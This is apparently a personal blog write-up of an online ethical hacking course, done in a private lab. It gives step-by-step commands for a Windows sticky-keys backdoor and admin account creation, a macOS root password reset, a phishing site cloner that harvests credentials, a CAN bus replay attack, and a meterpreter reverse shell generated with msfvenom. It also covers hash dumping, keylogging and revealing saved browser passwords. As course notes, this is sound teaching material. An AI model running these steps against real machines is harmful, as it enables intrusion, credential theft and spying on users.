---
title: "Ethical hacking course"
author: Ludovic COULON
date: 2020-03-11
hero: ./images/hero.jpeg
excerpt: "Ethical hacking course write up base on the course -> https://www.udemy.com/course/real-world-ethical-hacking/"
---

## Write up base on the course -> https://www.udemy.com/course/real-world-ethical-hacking/

First, what is a ethical hacker ? That's sounds wierd but is a greate question to ask.

Testing systems for weaknesses with explicit permission of the ower.

- Recommending and or applying fixes and improvements to secure the app/network.

**The security triad**

- **Confidentialty** **:** Information is protected from unauthorized access
- **Integrity :** Information is protected from unauthorized modification
- **Availability** **:** Timely access to information (by authorized people) is ensured

**Attackers**

**Outsiders :**

- Competitors (different compagny for exemple)
- Black hat / Gray hat hackers
- Origanized crime
- Terrorists
- Foreign government, military and others

**Insiders** **:**

- Customers, suppliers, vendors, or business partners
- Disgruntled current or former employees
- Contractors, temps or consultants

**How do we protect ?**

- **Prevention** - techniques that cause attacks to fail
- **Detection** - techniques that determine that an attack is under way or, has occurred and report it
- **Recovery** - techniques that stop attackers and assess and reparis any damaged caused

Hands-on : Reset the password and create an administrator user on any windows computer

Use f2/DEL/f12 to boot from Windows install disk.
Click **Troubleshoot**. Click **Command Prompt**.

<div className="Image__Small">
  <img src="https://i.imgur.com/dxLMnM8.png" alt="blog_image" />
</div>

Click on repair your computer for the windows 10 iso for exemple

<div className="Image__Small">
  <img src="https://i.imgur.com/SHITsos.png" alt="blog_image" />
</div>

Then troubleshoot

<div className="Image__Small">
  <img src="https://i.imgur.com/uCfBN3g.png" alt="blog_image" />
</div>

<div className="Image__Small">
  <img src="https://i.imgur.com/Ktr1bQq.png" alt="blog_image" />
</div>

Then finally command prompt

In the CMD window, type these commands:
**cd c:\windows\system32\
 copy sethc.exe sethc_old.exe
copy cmd.exe sethc.exe**

<div className="Image__Small">
  <img src="https://i.imgur.com/XXwAgTM.png" alt="blog_image" />
</div>

<div className="Image__Small">
  <img src="https://i.imgur.com/SJrRNqF.png" alt="blog_image" />
</div>

Now instead of having this popup for the shifts key you will have a command prompt !

Restart computer. At the login screen where you enter your
password, press the **Shift** key five times. CMD window appears.

<div className="Image__Small">
  <img src="https://i.imgur.com/oyQNcEN.png" alt="blog_image" />
</div>

To change your existing password, type:
**net user [ironman][jarvis]**
To add a new user and promote to Administrator:

**net user [ironman][jarvis] /add
net localgroup administrators ironman /add**

<div className="Image__Small">
  <img src="https://i.imgur.com/rnJlpeZ.png" alt="blog_image" />
</div>

**If you want to protect your computer for this attack please do this :**

Nerver leave your computer unattended
Change your BIOS settings to require a password to change the boot order or the boot device.

Hands-on : Exact same thing but this time with macOS

• On the login prompt press (**Command+S**)

• At the Terminal, type **clear** to clear the screen, then:

**/sbin/fsck –fy
/sbin/mount -uw /
launchctl load /System/Library/LaunchDaemons/com.apple.opendirectoryd.plist**

<div className="Image__Small">
  <img src="https://i.imgur.com/gxkzcL8.png" alt="blog_image" />
</div>

**passwd**

<div className="Image__Small">
  <img src="https://i.imgur.com/X0Pi6c5.png" alt="blog_image" />
</div>

• Enter a new ‘root’ password, twice
**exit**

• Log in as **root** using the new password

**Helpful Linux Terminal Commands:**

- **ls [list, ls -al ]**
- **cd [chang dir, cd .. ]**
- **uname -a [OS info]**
- **history [also up arrow]**
- **sudo [super user do]**
- **mkdir/rmdir [create dir]**
- **cp/mv/rm [copy/move/del files]**
- **man [help or cmd --help]**
- **pwd [print working dir]**
- **echo [print to screen, > to file]**
- **nano [text editor, CTRL‐X]**
- **more [show contents of file]**
- **find -name [find file by name]**
- **locate [locate after updatedb]**
- **ping/ifconfig [network]**
- **env [show all environment vars]**

**Helpful Windows Commands:**

- **dir [list files in directory]**
- **cd [chang dir, cd .. ]**
- **ver [OS info]doskey /h [also up arrow]**
- **sudo [run cmd as administrator]**
- **mkdir/rmdir [also md/rd]**
- **copy/move/del [copy files]**
- **help [help or cmd /?]**
- **cd [print current dir]**
- **echo [print to screen, > to file]**
- **notepad [text editor]**
- **more [show contents of file]**
- **find [no exact equivalent]**
- **ping [ping an address/host]**
- **ipconfig [network info]**
- **set [show all environment vars]**

Lab for my pentest (Windows 10, Windows 7, Kali, MacOS, Metasploit2VM)

**Metasploit commands :**

- msfadmin:msfadmin
- (**root**) > rlogin -l root **[IP]**

**Windows 10 commands :**

- root:toor

**Windows 7 commands :**

- root:toor

**Kali commands :**

- root:toor

Network for the lab (private host)

**10.0.3.X / 255.255.255.0**

<div className="Image__Small">
  <img src="https://i.imgur.com/PAL0wzb.png" alt="blog_image" />
</div>

<div className="Image__Small">
  <img src="https://i.imgur.com/EHkd3k0.png" alt="blog_image" />
</div>

Now our second network adapter for update the VM/Kali

<div className="Image__Small">
  <img src="https://i.imgur.com/1coB78k.png" alt="blog_image" />
</div>

**Social engineering attack**

- **Phishing attack**
- **Pretexting** (Like i'm pretending to be your dad and i want some money #leboncoin)
- **Baiting** (USB drive on a bus)
- **Quid pro quo** (If you help me with this, i'll send you some money)
- **Tailgating** (Follow someone to gain access to bulding)
- **Vishing** (Voice form of phishing - pretending to be your bank for exemple)
- **Spear-phishing** (Customise a phishing mail with specific informations)

**Fist attack : Site cloner with credentials stealing**

<div className="Image__Small">
  <img src="https://i.imgur.com/hq1o76P.png" alt="blog_image" />
</div>

Fist launch SET

<div className="Image__Small">
  <img src="https://i.imgur.com/18VC0dB.png" alt="blog_image" />
</div>

- Type 1 for the social engineering attack

<div className="Image__Small">
  <img src="https://i.imgur.com/3kt43UT.png" alt="blog_image" />
</div>

- Type 2 for the website attack

<div className="Image__Small">
  <img src="https://i.imgur.com/bPp3Slf.png" alt="blog_image" />
</div>

- Then select the third for the credentials haverster attack method

<div className="Image__Small">
  <img src="https://i.imgur.com/XcDAMLr.png" alt="blog_image" />
</div>

- Select the site cloner for the perfect illusion

<div className="Image__Small">
  <img src="https://i.imgur.com/Ajr9Awx.png" alt="blog_image" />
</div>

- Now enter you local IP of your computer of what ever you may need

<div className="Image__Small">
  <img src="https://i.imgur.com/MsQm1yw.png" alt="blog_image" />
</div>

- Enter the website that you want to replicate

<div className="Image__Small">
  <img src="https://i.imgur.com/IEG6vCs.png" alt="blog_image" />
</div>

- And its done ! you just need to wait now.

<div className="Image__Small">
  <img src="https://i.imgur.com/l3gZ59f.png" alt="blog_image" />
</div>

- Once you are done with this you can close the program and it will generate a report

<div className="Image__Small">
  <img src="https://i.imgur.com/XHikJcz.png" alt="blog_image" />
</div>

You can see the email and pass !

**Now we are gonna change the url of the payload**

<div className="Image__Small">
  <img src="https://i.imgur.com/nA3uzbD.png" alt="blog_image" />
</div>

If we go to our windows 10 VM and we type the IP of the Kali VM you can see the payload, the payload with this address is not very effective this way.

If we convert our payload IP (Kali VM) into decimal we have this result : 167774592

And if we type this in the url (http://167774592)

<div className="Image__Small">
  <img src="https://i.imgur.com/dXyQpEH.png" alt="blog_image" />
</div>

It redirect in our payload address

**For even more obfuscation you can use this : http://facebook.com@167774592**

**Second attack : Car hacking (in a VM because i don't have a car :/)**

To do this hack we need to install **some depedencies** :

- **sudo apt-get install libsdl2-dev**
- **sudo apt-get install libsdl2-image-dev**

Install the **can-utils** :

- **sudo apt-get install can-utils**

Now you can download the **ICSim tools** in github

- **cd ~**
- **git clone https://gtihub.com/zombieCraig/ICSim.git**

**End result**

<div className="Image__Small">
  <img src="https://i.imgur.com/cZePD3m.png" alt="blog_image" />
</div>

**1 Start the virtual CAN network :**

- modprobe vcan
- dmseg (to see the error log)
- ip link add dev vcan0 type vcan
- ip link set up vcan0

**2 Run cansniffer :**

- cansniffer -c vcan0

**3 Open a new terminal windows and type :**

- cd Desktop/ICSim
- ./icsim vcan0

**4 And lastly open a new terminal window and type :**

cd Desktop/ICSim
./controls vcan0

<div className="Image__Small">
  <img src="https://i.imgur.com/7E3reRI.png" alt="blog_image" />
</div>

You can close, accelerate, open door everything.

**Car replay attack**

**While running the ICSim :**

- Start the candump packet capture tool
  - candump -l vcan0
  - Now you can mess up with the controls (accelerate, door open, close)

**Now switch back to the candump terminal window and stop the capture with CTRL-C**

- ls
- [candump-file].log

<div className="Image__Small">
  <img src="https://i.imgur.com/c7IEFH6.png" alt="blog_image" />
</div>

**And now you can use this attack with :**

- canplayer -I [candump-file].log vcan0

<div className="Image__Small">
  <img src="https://i.imgur.com/1Opw3wO.png" alt="blog_image" />
</div>

- [https://www.swisstransfer.com/d/cc1dccf6-9eb0-4704-b6a2-f41b4927070b](https://www.swisstransfer.com/d/cc1dccf6-9eb0-4704-b6a2-f41b4927070b) (proof of concept)

**Third attack : Getting root in a windows 7 machine with metasploit**

1. **First launch metasploit**

- **msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.3.3 -f exe -o /root/Desktop/Unityx64**
  - **-p is for the payload**
  - **LHOST is the ip address of the attacker machine (Kali in this case)**
  - **-f is for the file extension (exe)**
  - **-o is for the output where the file is going to be created with the name of course.**

<div className="Image__Small">
  <img src="https://i.imgur.com/QK83xE3.png" alt="blog_image" />
</div>

- **Now copy the payload on the var/www/ repertory**

<div className="Image__Small">
  <img src="https://i.imgur.com/iUkmSKA.png" alt="blog_image" />
</div>

- Then add privilege with the following command :

<div className="Image__Small">
  <img src="https://i.imgur.com/Zzx1wBd.png" alt="blog_image" />
</div>

- Finally you can start the apache service with :

**Now you can go to your windows 7 machine and type the ip of the attacker machine in your brower**

<div className="Image__Small">
  <img src="https://i.imgur.com/3Zr72s1.png" alt="blog_image" />
</div>

**Now go back to the msf console and type the following commands :**

- **use exploit/multi/handler**

**exploit -g -z**

- **Now you can donwload and execute the infected file on the windows 7 machine.**

<div className="Image__Small">
  <img src="https://i.imgur.com/6YDASs1.png" alt="blog_image" />
</div>

Click on the check box if you can't download the exe

**If everything is correct you will see this**

<div className="Image__Small">
  <img src="https://i.imgur.com/iGF17Hv.png" alt="blog_image" />
</div>

**Now the spicy part, exploit the victim with meterpreter**

<div className="Image__Small">
  <img src="https://i.imgur.com/QZaBoos.png" alt="blog_image" />
</div>

- First, create a session with the victim computer with :

**You can run the following command to optain the hash and the username of the machine**

<div className="Image__Small">
  <img src="https://i.imgur.com/Z5oY5eS.png" alt="blog_image" />
</div>

- **getuid > optain the user of the session**
- **run hashdump > optain the password hash of the user**

**You can see the image, the user that we infect is not an administrator user, so we need to elevate privileges.**

**Elevate privileges on windows 7**

<div className="Image__Small">
  <img src="https://i.imgur.com/PycwRxe.png" alt="blog_image" />
</div>

- First, you can type "**background**" to go back to the msf5 console then :

<div className="Image__Small">
  <img src="https://i.imgur.com/t8noPAI.png" alt="blog_image" />
</div>

- **set payload windows/meterpreter/reverse_tcp**

<div className="Image__Small">
  <img src="https://i.imgur.com/l8yE6p8.png" alt="blog_image" />
</div>

**You are now successfully administrator of the victim pc**

**Forth attack : create a payload to infect an windows 10 machine**

<div className="Image__Small">
  <img src="https://i.imgur.com/yPf9ED2.png" alt="blog_image" />
</div>

Same ad before, you need to copy this exe file to you var/www/shared folder

and of course use chmod to change the privilege.

<div className="Image__Small">
  <img src="https://i.imgur.com/uyxAb6Q.png" alt="blog_image" />
</div>

- **use exploit/multi/handler**

<div className="Image__Small">
  <img src="https://i.imgur.com/w8shQr4.png" alt="blog_image" />
</div>

Now you can open the exe file on your windows 10 machine and voila ! you have a session open with the infected machine.

**Take a screenshot with meterpreter**

- screenshot

<div className="Image__Small">
  <img src="https://i.imgur.com/uwZDTeO.png" alt="blog_image" />
</div>

Scan the keystrokes on a windows machine

- keyscan_start
- keyscan_dump

<div className="Image__Small">
  <img src="https://i.imgur.com/H1WpIvB.png" alt="blog_image" />
</div>

**Problems with password**

- **Social engineering** (Phishing for exemple)
- **Snacking** : Look on your friend desk and find a post-it
- **Hacking**: Physical accesss can overwrite password (touches remanentes remplacé avec le CMD par exemple)
- **Hijicking** : Reveal password stored in browser (mozilla, chrome, other...)
- **Sniffing** : Use wireshark and some other tools to scan the network for password or usernames for exemple
- **Cracking** : Use hash dump and crack the password with a worldlist is a create exemple

**Fith attack : Hijiack password from mozilla**

**If you have for exemple access to a machine with a website open and a login prompt, go to saved password and if there is already a password go to inspect element and on the input type="password" replathe password with "text" to see the password in plain text.**
